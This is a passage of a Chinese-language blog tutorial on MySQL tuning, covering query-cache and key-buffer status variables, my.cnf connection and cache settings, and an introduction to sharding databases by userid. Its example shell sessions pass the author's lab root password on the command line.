&#x5F88;&#x5C0F;&#xFF0C;&#x8BF4;&#x660E;&#x7F13;&#x5B58;&#x4E0D;&#x591F;&#x7528;&#x4E86;</td></tr><tr><td>Qcache_not_cached</td><td>&#x6CA1;&#x6709;&#x8FDB;&#x884C;&#x7F13;&#x5B58;&#x7684;&#x67E5;&#x8BE2;&#x7684;&#x6570;&#x91CF;&#xFF0C;&#x901A;&#x5E38;&#x662F;&#x8FD9;&#x4E9B;&#x67E5;&#x8BE2;&#x672A;&#x88AB;&#x7F13;&#x5B58;&#x6216;&#x5176;&#x7C7B;&#x578B;&#x4E0D;&#x5141;&#x8BB8;&#x88AB;&#x7F13;&#x5B58;</td></tr><tr><td>Qcache_queries_in_cache</td><td>&#x5728;&#x5F53;&#x524D;&#x7F13;&#x5B58;&#x7684;&#x67E5;&#x8BE2;&#xFF08;&#x548C;&#x54CD;&#x5E94;&#xFF09;&#x7684;&#x6570;&#x91CF;</td></tr><tr><td>Qcache_total_blocks</td><td>&#x7F13;&#x5B58;&#x4E2D;&#x5757;&#x7684;&#x6570;&#x91CF;</td></tr></tbody></table><p>&#x4F8B;&#xFF1A;&#x4F7F;&#x7528;mysql&#x67E5;&#x8BE2;&#x7F13;&#x5B58;  </p><pre><code class="shell">[root@jaking ~]# cat /etc/my.cnf [mysqld]datadir=/data/mysqlsocket=/data/mysql/mysql.sockuser=mysql# Disabling symbolic-links is recommended to prevent assorted security riskssymbolic-links=0query_cache_size=32M #&#x81F3;&#x5C11;4M&#x4EE5;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x7ED3;&#x6784;&#xFF0C;&#x53EF;&#x6269;&#x5C55;&#xFF1B;&#x6574;&#x4F53;100G&#xFF0C;&#x82E5;&#x6B64;&#x670D;&#x52A1;&#x5668;&#x53EA;&#x8FD0;&#x884C;mysql&#x670D;&#x52A1;&#x5668;&#xFF0C;70-80G&#x7ED9;mysql[root@jaking ~]# systemctl restart mysqld</code></pre><pre><code class="sql">[root@jaking ~]# mysql -uroot -pJaking@vip.163.commysql&gt; create database aa;mysql&gt; use aa;mysql&gt; create table test (id int, name varchar(255)) ;mysql&gt; insert into test values (1,&apos;aaaa&apos;), (2,&apos;aaaa&apos;);mysql&gt; select * from test;mysql&gt; show status like &quot;qcache%&quot;;+-------------------------+----------+| Variable_name           | Value    |+-------------------------+----------+| Qcache_free_blocks      | 1        || Qcache_free_memory      | 33535112 || Qcache_hits             | 0        |   -- &#x6CA1;&#x6709;&#x547D;&#x4E2D;| Qcache_inserts          | 1        |  -- &#x7B2C;&#x4E00;&#x6B21;&#x63D2;&#x5165;&#x4E00;&#x6761;&#x8BED;&#x53E5;| Qcache_lowmem_prunes    | 0        || Qcache_not_cached       | 3        || Qcache_queries_in_cache | 1        || Qcache_total_blocks     | 4        |-- &#x518D;&#x67E5;&#x8BE2;&#xFF1A;mysql&gt; select * from test;mysql&gt; show status like &quot;qcache%&quot;;+-------------------------+----------+| Variable_name           | Value    |+-------------------------+----------+| Qcache_free_blocks      | 1        || Qcache_free_memory      | 33535112 || Qcache_hits             | 1        | -- &#x7B2C;&#x4E8C;&#x6B21;&#x67E5;&#x8BE2;&#x65F6;&#xFF0C;&#x5C31;&#x547D;&#x4E2D;&#x4E86;| Qcache_inserts          | 1        |Qcache_hits/&#xFF08;Qcache_inserts+ Qcache_hits&#xFF09; &#x547D;&#x4E2D;&#x7387;-- &#x7ECF;&#x8FC7;&#x591A;&#x6B21;select&#xFF0C;&#x547D;&#x4E2D;&#x7684;&#x6B21;&#x6570;&#x4E5F;&#x4F1A;&#x589E;&#x52A0;&#xFF1A;mysql&gt; show status like &apos;qcache%&apos;;  +-------------------------+----------+| Variable_name           | Value    |+-------------------------+----------+| Qcache_free_blocks      | 1        || Qcache_free_memory      | 33535344 || Qcache_hits             | 3        | -- &#x7B2C;&#x56DB;&#x6B21;&#x67E5;&#x8BE2;&#x65F6;&#xFF0C;&#x5C31;&#x547D;&#x4E2D;3&#x6B21;| Qcache_inserts          | 1        |</code></pre><p>&#x5F3A;&#x5236;&#x9650;&#x5236;MySQL &#x8D44;&#x6E90;&#x8BBE;&#x7F6E;<br>&#x53EF;&#x4EE5;&#x5728;mysqld&#x4E2D;&#x5F3A;&#x5236;&#x4E00;&#x4E9B;&#x9650;&#x5236;&#x6765;&#x786E;&#x4FDD;&#x7CFB;&#x7EDF;&#x8D1F;&#x8F7D;&#x4E0D;&#x4F1A;&#x5BFC;&#x81F4;&#x8D44;&#x6E90;&#x8017;&#x5C3D;&#x7684;&#x60C5;&#x51B5;&#x51FA;&#x73B0;&#x3002;  </p><pre><code class="shell">[root@jaking ~]# vim /etc/my.cnf [mysqld]datadir=/data/mysqlsocket=/data/mysql/mysql.sockuser=mysql# Disabling symbolic-links is recommended to prevent assorted security riskssymbolic-links=0query_cache_size = 32M max_connections=500  #&#x4E0A;&#x9650;&#x662F;&#x770B;&#x786C;&#x4EF6;&#x914D;&#x7F6E;wait_timeout=10 max_connect_errors=100[root@jaking ~]# systemctl restart mysqld</code></pre><p><strong>&#x53C2;&#x6570;&#xFF1A;</strong><br>&#x7B2C;&#x4E00;&#x884C;&#xFF1A;&#x6700;&#x5927;&#x8FDE;&#x63A5;&#x6570;&#xFF0C;&#x5728;&#x670D;&#x52A1;&#x5668;&#x6CA1;&#x6709;&#x5D29;&#x6E83;&#x4E4B;&#x524D;&#x786E;&#x4FDD;&#x53EA;&#x5EFA;&#x7ACB;&#x670D;&#x52A1;&#x5141;&#x8BB8;&#x6570;&#x76EE;&#x7684;&#x8FDE;&#x63A5;<br>&#x8BE5;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#x8FC7;&#x5C0F;&#x7684;&#x6700;&#x660E;&#x663E;&#x7279;&#x5F81;&#x662F;&#x51FA;&#x73B0;&#x201C;Too many connections&#x201D;&#x9519;&#x8BEF;  </p><p>&#x7B2C;&#x4E8C;&#x884C;&#xFF1A;mysqld&#x5C06;&#x7EC8;&#x6B62;&#x7B49;&#x5F85;&#x65F6;&#x95F4;&#xFF08;&#x7A7A;&#x95F2;&#x65F6;&#x95F4;&#xFF09;&#x8D85;&#x8FC7;10&#x79D2;&#x7684;&#x8FDE;&#x63A5;&#xFF1B;&#x5728;LAMP&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4E2D;&#xFF0C;&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;&#x7684;&#x65F6;&#x95F4;&#x901A;&#x5E38;&#x5C31;&#x662F;Web &#x670D;&#x52A1;&#x5668;&#x5904;&#x7406;&#x8BF7;&#x6C42;&#x6240;&#x82B1;&#x8D39;&#x7684;&#x65F6;&#x95F4;&#xFF1B;&#x6709;&#x65F6;&#x5019;&#x5982;&#x679C;&#x8D1F;&#x8F7D;&#x8FC7;&#x91CD;&#xFF0C;&#x8FDE;&#x63A5;&#x4F1A;&#x6302;&#x8D77;&#xFF0C;&#x5E76;&#x4E14;&#x4F1A;&#x5360;&#x7528;&#x8FDE;&#x63A5;&#x8868;&#x7A7A;&#x95F4;&#xFF1B;&#x5982;&#x679C;&#x6709;&#x591A;&#x4E2A;&#x4EA4;&#x4E92;&#x7528;&#x6237;&#x4F7F;&#x7528;&#x4E86;&#x5230;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6301;&#x4E45;&#x8FDE;&#x63A5;&#xFF0C;&#x90A3;&#x4E48;&#x5E94;&#x8BE5;&#x5C06;&#x8FD9;&#x4E2A;&#x503C;&#x8BBE;&#x4F4E;&#x4E00;&#x70B9;&#x3002;  </p><p>&#x7B2C;&#x4E09;&#x884C;&#xFF1A;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x4E3B;&#x673A;&#x5728;&#x8FDE;&#x63A5;&#x5230;&#x670D;&#x52A1;&#x5668;&#x65F6;&#x6709;&#x95EE;&#x9898;&#xFF0C;&#x5E76;&#x91CD;&#x8BD5;&#x5F88;&#x591A;&#x6B21;&#x540E;&#x653E;&#x5F03;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x4E2A;&#x4E3B;&#x673A;&#x5C31;&#x4F1A;&#x88AB;&#x9501;&#x5B9A;&#xFF0C;&#x76F4;&#x5230;&#x6267;&#x884C;  </p><pre><code class="sql">mysql&gt; FLUSH HOSTS;Query OK, 0 rows affected (0.00 sec)</code></pre><p>&#x4E4B;&#x540E;&#x624D;&#x80FD;&#x8FD0;&#x884C;&#x3002;  </p><p>&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;10 &#x6B21;&#x5931;&#x8D25;&#x5C31;&#x8DB3;&#x4EE5;&#x5BFC;&#x81F4;&#x9501;&#x5B9A;&#x4E86;&#xFF1B;&#x5C06;&#x8FD9;&#x4E2A;&#x503C;&#x4FEE;&#x6539;&#x4E3A;100 &#x4F1A;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#x8DB3;&#x591F;&#x7684;&#x65F6;&#x95F4;&#x6765;&#x4ECE;&#x95EE;&#x9898;&#x4E2D;&#x6062;&#x590D;&#xFF1B;&#x5982;&#x679C;&#x91CD;&#x8BD5;100 &#x6B21;&#x90FD;&#x65E0;&#x6CD5;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#xFF0C;&#x90A3;&#x4E48;&#x4F7F;&#x7528;&#x518D;&#x9AD8;&#x7684;&#x503C;&#x4E5F;&#x4E0D;&#x4F1A;&#x6709;&#x592A;&#x591A;&#x5E2E;&#x52A9;&#xFF0C;&#x53EF;&#x80FD;&#x5B83;&#x6839;&#x672C;&#x5C31;&#x65E0;&#x6CD5;&#x8FDE;&#x63A5;&#x3002;  </p><p>&#x9A8C;&#x8BC1;&#xFF1A;  </p><pre><code class="sql">[root@jaking ~]# mysql -uroot -pJaking@vip.163.commysql&gt; show status like &apos;max_used_connections&apos;;+----------------------+-------+| Variable_name        | Value |+----------------------+-------+| Max_used_connections | 1  |#&#x5F53;&#x524D;&#x6709;&#x4E00;&#x4E2A;mysql&#x8FDE;&#x63A5;+----------------------+-------+1 row in set (0.00 sec)&#x518D;&#x53E6;&#x4E00;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x6253;&#x5F00;&#x4E00;&#x4E2A;mysql&#x8FDE;&#x63A5;&#xFF0C;&#x6267;&#x884C;&#x4E00;&#x4E0B;&#x67E5;&#x8BE2;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6709;&#x4E24;&#x4E2A;[root@jaking ~]# mysql -uroot -pJaking@vip.163.commysql&gt; show status like &apos;max_used_connections&apos;;+----------------------+-------+| Variable_name        | Value |+----------------------+-------+| Max_used_connections | 2  |</code></pre><p><strong>&#x603B;&#x7ED3;&#xFF1A;</strong><br>mysql&#x6709;&#x8D85;&#x8FC7;100&#x4E2A;&#x53EF;&#x4EE5;&#x8C03;&#x8282;&#x7684;&#x8BBE;&#x7F6E;&#xFF0C;&#x8981;&#x8BB0;&#x4F4F;&#x90A3;&#x4E48;&#x591A;&#x57FA;&#x672C;&#x662F;&#x4E0D;&#x53EF;&#x80FD;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x5E78;&#x8FD0;&#x7684;&#x662F;&#x4F60;&#x53EA;&#x9700;&#x8981;&#x8BB0;&#x4F4F;&#x5F88;&#x5C11;&#x4E00;&#x90E8;&#x5206;&#x4F60;&#x5C31;&#x53EF;&#x4EE5;&#x57FA;&#x672C;&#x6EE1;&#x8DB3;&#x4F60;&#x7684;&#x9700;&#x6C42;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x8FD8;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x201C;SHOW STATUS&#x201D;&#x547D;&#x4EE4;&#x6765;&#x67E5;&#x770B;mysql&#x662F;&#x5426;&#x6309;&#x7167;&#x6211;&#x4EEC;&#x7684;&#x671F;&#x671B;&#x5728;&#x8FD0;&#x884C;  </p><p><strong>&#x8868;&#x9AD8;&#x901F;&#x7F13;&#x5B58;&#xFF1A;</strong><br>&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x8868;&#x5B58;&#x50A8;&#x5728;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x8981;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x4F60;&#x5FC5;&#x987B;&#x5148;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x8BFB;&#x53D6;&#xFF1B;&#x4E3A;&#x4E86;&#x52A0;&#x5FEB;&#x4ECE;&#x6587;&#x4EF6;&#x4E2D;&#x8BFB;&#x53D6;&#x6570;&#x636E;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;mysqld &#x5BF9;&#x8FD9;&#x4E9B;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x4E86;&#x7F13;&#x5B58;&#xFF0C;&#x5176;&#x6700;&#x5927;&#x6570;&#x76EE;&#x7531; /etc/my.cnf&#x4E2D;&#x7684; table_open_cache &#x6307;&#x5B9A;  </p><p>&#x4F8B;&#x5982;&#xFF1A;  </p><pre><code class="shell">[root@jaking ~]# vim /etc/my.cnf [mysqld] datadir=/var/lib/mysql &#x2026;&#x2026; table_open_cache=24  #&#x7F13;&#x5B58;24&#x4E2A;&#x8868; [root@jaking ~]# systemctl restart mysqld[root@jaking ~]# mysql -uroot -pJaking@vip.163.commysql&gt;  show global status like &apos;open%_tables&apos;;+---------------+-------+| Variable_name | Value |+---------------+-------+| Open_tables   | 1     || Opened_tables | 114   |+---------------+-------+ </code></pre><p>Open_tables &#x8868;&#x793A;&#x6253;&#x5F00;&#x8868;&#x7684;&#x6570;&#x91CF;&#xFF0C;Opened_tables&#x8868;&#x793A;&#x6253;&#x5F00;&#x8FC7;&#x7684;&#x8868;&#x6570;&#x91CF;&#xFF0C;&#x5982;&#x679C;Opened_tables&#x6570;&#x91CF;&#x8FC7;&#x5927;&#xFF0C;&#x8BF4;&#x660E;&#x914D;&#x7F6E;&#x4E2D; table_cache(5.1.3&#x4E4B;&#x540E;&#x8FD9;&#x4E2A;&#x503C;&#x53EB;&#x505A;table_open_cache)&#x503C;&#x53EF;&#x80FD;&#x592A;&#x5C0F;<br>table_cache &#x7684;&#x503C;&#x5728; 2G &#x5185;&#x5B58;&#x4EE5;&#x4E0B;&#x7684;&#x673A;&#x5668;&#x4E2D;&#x7684;&#x503C;&#x9ED8;&#x8BA4;&#x4ECE; 256 &#x5230; 512&#x4E2A;<br>&#x5BF9;&#x4E8E;&#x6709; 1G &#x5185;&#x5B58;&#x7684;&#x673A;&#x5668;&#xFF0C;&#x63A8;&#x8350;&#x503C;&#x662F; 128-256  </p><p>&#x5173;&#x952E;&#x5B57;&#x7F13;&#x51B2;&#x533A;<br>key_buffer_size&#x6307;&#x5B9A;&#x7D22;&#x5F15;&#x7F13;&#x51B2;&#x533A;&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x5B83;&#x51B3;&#x5B9A;&#x7D22;&#x5F15;&#x5904;&#x7406;&#x7684;&#x901F;&#x5EA6;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x7D22;&#x5F15;&#x8BFB;&#x7684;&#x901F;&#x5EA6;  </p><p>&#x4F8B;&#xFF1A;&#x5173;&#x952E;&#x5B57;&#x7F13;&#x5B58; , &#x7F13;&#x5B58;&#x6765;&#x7F13;&#x5B58;&#x7D22;&#x5F15;  </p><pre><code class="shell">[root@jaking ~]# vim /etc/my.cnf [mysqld]datadir=/var/lib/mysql&#x2026;&#x2026;key_buffer_size=512M#&#x53EA;&#x8DD1;&#x4E00;&#x4E2A;mysql&#x670D;&#x52A1;&#xFF0C;&#x7ED3;&#x5408;&#x6240;&#x6709;&#x7F13;&#x5B58;&#xFF0C;mysql&#x6574;&#x4F53;&#x4F7F;&#x7528;&#x7684;&#x7F13;&#x5B58;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x7269;&#x7406;&#x5185;&#x5B58;&#x7684;80%[root@jaking ~]# systemctl restart mysqld&#x67E5;&#x770B;&#xFF1A;[root@jaking ~]# mysql -uroot -pJaking@vip.163.commysql&gt; show status like &apos;%key_read%&apos;;+-------------------+-------+| Variable_name     | Value |+-------------------+-------+| Key_read_requests | 6     || Key_reads         | 3     |+-------------------+-------+2 rows in set (0.00 sec)</code></pre><p>&#x5173;&#x952E;&#x5B57;&#xFF0C;&#x7406;&#x60F3;&#x60C5;&#x51B5;&#x4E0B;&#x5BF9;&#x4E8E;&#x4ED6;&#x7684;&#x8BF7;&#x6C42;&#x5E94;&#x8BE5;&#x6765;&#x81EA;&#x4E8E;&#x5185;&#x5B58;&#x800C;&#x4E0D;&#x662F;&#x78C1;&#x76D8;&#xFF0C;&#x4ECE;&#x8FD9;&#x4E2A;&#x8868;&#x4E2D;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#x6709;&#x591A;&#x5C11;&#x662F;Key_reads &#x4EE3;&#x8868;&#x547D;&#x4E2D;&#x78C1;&#x76D8;&#x7684;&#x8BF7;&#x6C42;&#x4E2A;&#x6570;&#xFF0C;Key_read_requests &#x662F;&#x603B;&#x6570;&#xFF0C; &#x547D;&#x4E2D;&#x78C1;&#x76D8;&#x7684;&#x8BFB;&#x8BF7;&#x6C42;&#x6570;&#x9664;&#x4EE5;&#x8BFB;&#x8BF7;&#x6C42;&#x603B;&#x6570;&#x5C31;&#x662F;&#x4E0D;&#x4E2D;&#x6BD4;&#x7387;&#xFF1B;&#x5982;&#x679C;&#x6BCF; 1000 &#x4E2A;&#x8BF7;&#x6C42;&#x4E2D;&#x547D;&#x4E2D;&#x78C1;&#x76D8;&#x7684;&#x6570;&#x76EE;&#x8D85;&#x8FC7; 1 &#x4E2A;&#xFF0C;&#x5C31;&#x5E94;&#x8BE5;&#x8003;&#x8651;&#x589E;&#x5927;&#x5173;&#x952E;&#x5B57;&#x7F13;&#x51B2;&#x533A;&#x4E86;<br>&#x547D;&#x4E2D;&#x7387;&#xFF1A;(1-(Key_reads / Key_read_requests ) )*100  </p><pre><code class="sql">[root@jaking ~]# mysql -uroot -pJaking@vip.163.commysql&gt; create database jaking; use jaking; create table test2 (id int,name varchar(24)); insert into test2 values (1,&apos;aaaaa&apos;),(2,&apos;aaaaa&apos;),(3,&apos;aaaaa&apos;); create index idx_name on test2(name);mysql&gt; show status like &apos;%key_read%&apos;;+-------------------+-------+| Variable_name     | Value |+-------------------+-------+| Key_read_requests | 6     || Key_reads         | 3     |+-------------------+-------+2 rows in set (0.00 sec)mysql&gt; select name from test2;+-------+| name  |+-------+| aaaaa || aaaaa || aaaaa |+-------+3 rows in set (0.00 sec)mysql&gt; show status like &apos;%key_read%&apos;;+-------------------+-------+| Variable_name     | Value |+-------------------+-------+| Key_read_requests | 6     || Key_reads         | 3     |+-------------------+-------+2 rows in set (0.00 sec)</code></pre><p>&#x603B;&#x7ED3;&#xFF1A;<br>1&#x3001;&#x770B;&#x673A;&#x5668;&#x914D;&#x7F6E;&#xFF0C;&#x6307;&#x4E09;&#x5927;&#x4EF6;&#xFF1A;cpu&#x3001;&#x5185;&#x5B58;&#x3001;&#x786C;&#x76D8;<br>2&#x3001;&#x770B;mysql&#x914D;&#x7F6E;&#x53C2;&#x6570;<br>3&#x3001;&#x67E5;&#x770B;mysql&#x884C;&#x72B6;&#x6001;<br>4&#x3001;&#x67E5;&#x770B;mysql&#x7684;&#x6162;&#x67E5;&#x8BE2;<br>&#x4F9D;&#x6B21;&#x89E3;&#x51B3;&#x4E86;&#x4EE5;&#x4E0A;&#x95EE;&#x9898;&#x4E4B;&#x540E;&#xFF0C;&#x518D;&#x6765;&#x67E5;&#x627E;&#x7A0B;&#x5E8F;&#x65B9;&#x9762;&#x7684;&#x95EE;&#x9898;  </p><p>#&#x4E0D;&#x8FDB;&#x884C;&#x57DF;&#x540D;&#x53CD;&#x89E3;&#x6790;,&#x6CE8;&#x610F;&#x7531;&#x6B64;&#x5E26;&#x6765;&#x7684;&#x6743;&#x9650;/&#x6388;&#x6743;&#x95EE;&#x9898;&#xFF1B;&#x5173;&#x95ED; MySQL &#x7684; DNS &#x53CD;&#x67E5;&#x529F;&#x80FD;&#xFF1B;&#x8FD9;&#x6837;&#x901F;&#x5EA6;&#x5C31;&#x5FEB;&#x4E86;!  </p><pre><code class="shell">[root@jaking ~]# echo skip-name-resolve &gt;&gt; /etc/my.cnf[root@jaking ~]# systemctl restart mysqld</code></pre><p>&#x8BE5;&#x9009;&#x9879;&#x5C31;&#x80FD;&#x7981;&#x7528;DNS &#x89E3;&#x6790;&#xFF0C;&#x8FDE;&#x63A5;&#x901F;&#x5EA6;&#x4F1A;&#x5FEB;&#x5F88;&#x591A;&#xFF1B;&#x4E0D;&#x8FC7;&#xFF0C;&#x8FD9;&#x6837;&#x7684;&#x8BDD;&#x5C31;&#x4E0D;&#x80FD;&#x5728;MySQL &#x7684;&#x6388;&#x6743;&#x8868;&#x4E2D;&#x4F7F;&#x7528;&#x4E3B;&#x673A;&#x540D;&#x4E86;&#x800C;&#x53EA;&#x80FD;&#x7528;IP&#x683C;&#x5F0F;  </p><p>#&#x7D22;&#x5F15;&#x7F13;&#x5B58;,&#x6839;&#x636E;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#x800C;&#x5B9A;,&#x5982;&#x679C;&#x662F;&#x72EC;&#x7ACB;&#x7684; DB &#x670D;&#x52A1;&#x5668;,&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x9AD8;&#x8FBE;80%&#x7684;&#x5185;&#x5B58;&#x603B;&#x91CF;  </p><pre><code>key_buffer_size=512M</code></pre><p>#&#x6253;&#x5F00;&#x8868;&#x7F13;&#x5B58;&#x603B;&#x4E2A;&#x6570;,&#x53EF;&#x4EE5;&#x907F;&#x514D;&#x9891;&#x7E41;&#x7684;&#x6253;&#x5F00;&#x6570;&#x636E;&#x8868;&#x4EA7;&#x751F;&#x7684;&#x5F00;&#x9500;  </p><pre><code>table_open_cache=24query_cache_size=128M max_connections=10000 #&#x6700;&#x5927;&#x8FDE;&#x63A5;&#x6570;</code></pre><p>#&#x8BBE;&#x7F6E;&#x8D85;&#x65F6;&#x65F6;&#x95F4;,&#x80FD;&#x907F;&#x514D;&#x957F;&#x8FDE;&#x63A5;  </p><pre><code>wait_timeout=60</code></pre><p>#&#x8BB0;&#x5F55;&#x6162;&#x67E5;&#x8BE2;,&#x7136;&#x540E;&#x5BF9;&#x6162;&#x67E5;&#x8BE2;&#x4E00;&#x4E00;&#x4F18;&#x5316;&#x5355;&#x4F4D;&#xFF1A;&#x79D2;  </p><pre><code>slow-queries- log-file=/var/lib/mysql/slow.loglong_query_time=5</code></pre><h3 id="&#x6269;&#x5C55;-MySQL&#x4F18;&#x5316;&#x4E4B;&#x2014;&#x2014;-&#x5206;&#x5E93;&#x5206;&#x8868;"><a href="#&#x6269;&#x5C55;-MySQL&#x4F18;&#x5316;&#x4E4B;&#x2014;&#x2014;-&#x5206;&#x5E93;&#x5206;&#x8868;" class="headerlink" title="&#x6269;&#x5C55; MySQL&#x4F18;&#x5316;&#x4E4B;&#x2014;&#x2014;-&#x5206;&#x5E93;&#x5206;&#x8868;"></a>&#x6269;&#x5C55; MySQL&#x4F18;&#x5316;&#x4E4B;&#x2014;&#x2014;-&#x5206;&#x5E93;&#x5206;&#x8868;</h3><p>1 &#x57FA;&#x672C;&#x601D;&#x60F3;&#x4E4B;&#x4EC0;&#x4E48;&#x662F;&#x5206;&#x5E93;&#x5206;&#x8868;&#xFF1F;<br>&#x4ECE;&#x5B57;&#x9762;&#x4E0A;&#x7B80;&#x5355;&#x7406;&#x89E3;&#xFF0C;&#x5C31;&#x662F;&#x628A;&#x539F;&#x672C;&#x5B58;&#x50A8;&#x4E8E;&#x4E00;&#x4E2A;&#x5E93;&#x7684;&#x6570;&#x636E;&#x5206;&#x5757;&#x5B58;&#x50A8;&#x5230;&#x591A;&#x4E2A;&#x5E93;&#x4E0A;&#xFF0C;&#x628A;&#x539F;&#x672C;&#x5B58;&#x50A8;&#x4E8E;&#x4E00;&#x4E2A;&#x8868;&#x7684;&#x6570;&#x636E;&#x5206;&#x5757;&#x5B58;&#x50A8;&#x5230;&#x591A;&#x4E2A;&#x8868;&#x4E0A;&#x3002;  </p><p>2 &#x57FA;&#x672C;&#x601D;&#x60F3;&#x4E4B;&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x5206;&#x5E93;&#x5206;&#x8868;&#xFF1F;<br>     &#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x91CF;&#x4E0D;&#x4E00;&#x5B9A;&#x662F;&#x53EF;&#x63A7;&#x7684;&#xFF0C;&#x5728;&#x672A;&#x8FDB;&#x884C;&#x5206;&#x5E93;&#x5206;&#x8868;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x968F;&#x7740;&#x65F6;&#x95F4;&#x548C;&#x4E1A;&#x52A1;&#x7684;&#x53D1;&#x5C55;&#xFF0C;&#x5E93;&#x4E2D;&#x7684;&#x8868;&#x4F1A;&#x8D8A;&#x6765;&#x8D8A;&#x591A;&#xFF0C;&#x8868;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x91CF;&#x4E5F;&#x4F1A;&#x8D8A;&#x6765;&#x8D8A;&#x5927;&#xFF0C;&#x76F8;&#x5E94;&#x5730;&#xFF0C;&#x6570;&#x636E;&#x64CD;&#x4F5C;&#xFF0C;&#x589E;&#x5220;&#x6539;&#x67E5;&#x7684;&#x5F00;&#x9500;&#x4E5F;&#x4F1A;&#x8D8A;&#x6765;&#x8D8A;&#x5927;&#xFF1B;&#x53E6;&#x5916;&#xFF0C;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8D44;&#x6E90;&#xFF08;CPU&#x3001;&#x78C1;&#x76D8;&#x3001;&#x5185;&#x5B58;&#x3001;IO&#x7B49;&#xFF09;&#x662F;&#x6709;&#x9650;&#x7684;&#xFF0C;&#x6700;&#x7EC8;&#x6570;&#x636E;&#x5E93;&#x6240;&#x80FD;&#x627F;&#x8F7D;&#x7684;&#x6570;&#x636E;&#x91CF;&#x3001;&#x6570;&#x636E;&#x5904;&#x7406;&#x80FD;&#x529B;&#x90FD;&#x5C06;&#x906D;&#x9047;&#x74F6;&#x9888;  </p><p>3 &#x5206;&#x5E93;&#x5206;&#x8868;&#x7684;&#x5B9E;&#x65BD;&#x7B56;&#x7565;&#x3002;<br>     &#x5982;&#x679C;&#x4F60;&#x7684;&#x5355;&#x673A;&#x6027;&#x80FD;&#x5F88;&#x4F4E;&#x4E86;&#xFF0C;&#x90A3;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x5206;&#x5E93;&#x3002;&#x5206;&#x5E93;&#xFF0C;&#x4E1A;&#x52A1;&#x900F;&#x660E;&#xFF0C;&#x5728;&#x7269;&#x7406;&#x5B9E;&#x73B0;&#x4E0A;&#x5206;&#x6210;&#x591A;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x5206;&#x5E93;&#x5728;&#x4E0D;&#x540C;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x3002;&#x5206;&#x533A;&#x53EF;&#x4EE5;&#x628A;&#x8868;&#x5206;&#x5230;&#x4E0D;&#x540C;&#x7684;&#x786C;&#x76D8;&#x4E0A;&#xFF0C;&#x4F46;&#x4E0D;&#x80FD;&#x5206;&#x914D;&#x5230;&#x4E0D;&#x540C;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x3002;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x7684;&#x6027;&#x80FD;&#x662F;&#x6709;&#x9650;&#x5236;&#x7684;&#xFF0C;&#x7528;&#x5206;&#x5E93;&#x53EF;&#x4EE5;&#x89E3;&#x51B3;&#x5355;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x6027;&#x80FD;&#x4E0D;&#x591F;&#xFF0C;&#x6216;&#x8005;&#x6210;&#x672C;&#x8FC7;&#x9AD8;&#x95EE;&#x9898;&#x3002;  </p><p>&#x5F53;&#x5206;&#x533A;&#x4E4B;&#x540E;&#xFF0C;&#x8868;&#x8FD8;&#x662F;&#x5F88;&#x5927;&#xFF0C;&#x5904;&#x7406;&#x4E0D;&#x8FC7;&#x6765;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#x53EF;&#x4EE5;&#x7528;&#x5206;&#x5E93;&#x3002;<br>orderid,userid,ordertime,&#x2026;..<br>userid%4=0&#xFF0C;&#x7528;&#x5206;&#x5E93;1<br>userid%4=1&#xFF0C;&#x7528;&#x5206;&#x5E93;2<br>userid%4=2, &#x7528;&#x5206;&#x5E93;3<br>userid%4=3&#xFF0C;&#x7528;&#x5206;&#x5E93;4  </p><p>&#x4E0A;&#x9762;&#x8FD9;&#x4E2A;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x5206;&#x5E93;&#x8DEF;&#x7531;&#xFF0C;&#x6839;&#x636E;userid&#x9009;&#x62E9;&#x5206;&#x5E93;&#xFF0C;&#x5373;&#x4E0D;&#x540C;&#x7684;&#x670D;&#x52A1;&#x5668;  </p><p>4 &#x5206;&#x5E93;&#x5206;&#x8868;&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;&#x3002;  </p><p>4.1 &#x4E8B;&#x52A1;&#x95EE;&#x9898;&#x3002;<br>     